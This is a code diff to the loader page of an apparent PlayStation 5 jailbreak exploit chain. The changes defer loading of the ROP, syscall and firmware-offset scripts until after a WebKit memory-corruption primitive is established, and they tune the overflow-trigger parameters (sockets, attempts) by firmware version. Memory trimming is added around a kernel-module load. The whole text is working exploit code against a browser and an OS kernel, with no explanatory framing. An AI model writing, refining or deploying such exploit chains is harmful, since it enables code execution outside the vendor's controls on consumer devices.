@@ -262,23 +262,11 @@
     document.getElementById("buildTag").textContent = "Build " + B;
     var q = "b=" + encodeURIComponent(B);
     document.getElementById("homeOpen").href = "?" + q
-        + "&go=1&auto=1&trigger=overflow&burn=full&payload=1";
-    document.getElementById("homeMenu").href = "?" + q + "&go=1&menu=1";
-    document.write('<script src="main.js?b=' + encodeURIComponent(B) + '"><\/script>');
+        + "&go=1&auto=1&trigger=overflow&burn=full&payload=1&sockets=48&attempts=64";
+    document.getElementById("homeMenu").href = "?" + q
+        + "&go=1&menu=1&sockets=32&attempts=12";
 })();
 </script>
-<script src="rop.js"></script>
-<script>window.offsetsReady = new Promise(function (res, rej) {
-    var s = document.querySelector('script[src^="../offsets/"]');
-    if (!s) return rej(new Error("offsets script was never injected by main.js"));
-    if (typeof OFFSET_wk_vtable_first_element !== "undefined") return res(s.src);
-    s.addEventListener("load", function () { res(s.src); });
-    s.addEventListener("error", function () {
-        rej(new Error("offsets 404: " + s.src));
-    });
-});
-</script>
-<script src="syscalls.js"></script>
 
 <script type="module">import { establishPrimitive, fakeCellReleased } from "./core.js";
 import { installWindowP, pairStatus } from "./mem.js";
@@ -316,17 +304,63 @@ function loadKernelModule() {
 
 function trimExploitMemory() {
     try {
+        screenLines.length = 0;
+        screenDirty = false;
         for (const id of ["scr", "early", "cfg", "summary", "tally", "vitals"]) {
             const el = document.getElementById(id);
             if (!el) continue;
             el.textContent = "";
             if ("innerHTML" in el) el.innerHTML = "";
         }
+        if (ARMED) {
+            const cat = document.getElementById("catImage");
+            if (cat && cat.src) {
+                cat.removeAttribute("src");
+                cat.style.display = "none";
+            }
+        }
         if (typeof globalThis.gc === "function") {
+            globalThis.gc();
             globalThis.gc();
             globalThis.gc();
         }
     } catch (e) { }
+}
+
+function loadScript(src) {
+    return new Promise((resolve, reject) => {
+        const s = document.createElement("script");
+        s.src = src;
+        s.onload = () => resolve();
+        s.onerror = () => reject(new Error("script load failed: " + src));
+        document.head.appendChild(s);
+    });
+}
+
+function waitOffsetsReady() {
+    return new Promise((resolve, reject) => {
+        const s = document.querySelector('script[src^="../offsets/"]');
+        if (!s) return reject(new Error("offsets script was never injected by main.js"));
+        if (typeof OFFSET_wk_vtable_first_element !== "undefined") return resolve(s.src);
+        s.addEventListener("load", () => resolve(s.src));
+        s.addEventListener("error", () => reject(new Error("offsets 404: " + s.src)));
+    });
+}
+
+let chainScriptsPromise = null;
+async function loadChainScripts() {
+    if (chainScriptsPromise) return chainScriptsPromise;
+    const B = encodeURIComponent(window.P2JB_BUILD || "dev");
+    chainScriptsPromise = (async () => {
+        flushMark("CHAIN-SCRIPTS-BEGIN", "deferred-after-webkit");
+        await loadScript("main.js?b=" + B);
+        window.offsetsReady = waitOffsetsReady();
+        await loadScript("rop.js?b=" + B);
+        await loadScript("syscalls.js?b=" + B);
+        await window.offsetsReady;
+        flushMark("CHAIN-SCRIPTS-OK", "main+rop+syscalls+offsets");
+    })();
+    return chainScriptsPromise;
 }
 
 async function settleMemory(ms) {
@@ -373,8 +407,13 @@ const BURN = (() => {
     return (b === "none" || b === "full") ? b : "full";
 })();
 const DEFAULT_ATTEMPTS = TRIGGER === "overflow"
-    ? (Q.get("menu") === "1" ? 24 : 96)
+    ? (Q.get("menu") === "1" ? 12 : 64)
     : 8;
+
+const FW_FLOAT = (() => {
+    const m = /PlayStation 5\/(\d+\.\d+)/.exec(navigator.userAgent);
+    return m ? parseFloat(m[1]) : 0;
+})();
 
 const cfg = {
 
@@ -384,7 +423,9 @@ const cfg = {
     netprobe: Q.get("netprobe") === "1",
     sockets: Math.max(4, Math.min(128,
         parseInt(Q.get("sockets") || "", 10)
-        || (window.fw_float >= 12.0 ? 64 : 80))),
+        || (Q.get("menu") === "1"
+            ? 32
+            : (FW_FLOAT >= 12.0 ? 48 : 80)))),
     attempts: Math.max(1, Math.min(512,
         parseInt(Q.get("attempts") || "", 10) || DEFAULT_ATTEMPTS)),
     kqBatch: Math.max(1, Math.min(32, parseInt(Q.get("kqbatch") || "", 10) || 8)),
@@ -1628,16 +1669,22 @@ async function bootChain() {
         stage("boot is taking more than 45 s");
     }, 45000);
     try {
+        refuseReferenceChain();
+        await ensureWebKitPrimitive();
+        if (typeof prepare !== "function") {
+            stage("loading chain scripts — deferred until after WebKit to reduce OOM");
+            await loadChainScripts();
+            await settleMemory(1000);
+        }
         stage("preflight");
         await preflight();
-        refuseReferenceChain();
-        await bootPrimitiveAndChain();
+        await ensurePrepare();
     } finally {
         clearTimeout(bootTimer);
     }
 }
 
-async function bootPrimitiveAndChain() {
+async function ensureWebKitPrimitive() {
     if (globalThis.p && typeof globalThis.p.read8 === "function") {
         flushMark("PRIMITIVE-REUSED", "window.p was already published");
     } else if (typeof window.jbReady === "object" && window.jbReady !== null
@@ -1720,7 +1767,9 @@ async function bootPrimitiveAndChain() {
             throw new Error("the (main, worker) pair was NOT promoted ("
                 + pairStatus.error + ")");
     }
+}
 
+async function ensurePrepare() {
     const p = globalThis.p;
     if (!p || typeof p.read8 !== "function")
         throw new Error("window.p was never published");
@@ -1776,8 +1825,11 @@ async function main() {
         }
 
         stage("loading kernel module — this uses a lot of memory");
+        await settleMemory(2000);
+        trimExploitMemory();
         await loadKernelModule();
         trimExploitMemory();
+        await settleMemory(500);
         await chooseCore();
 
         makeContext();
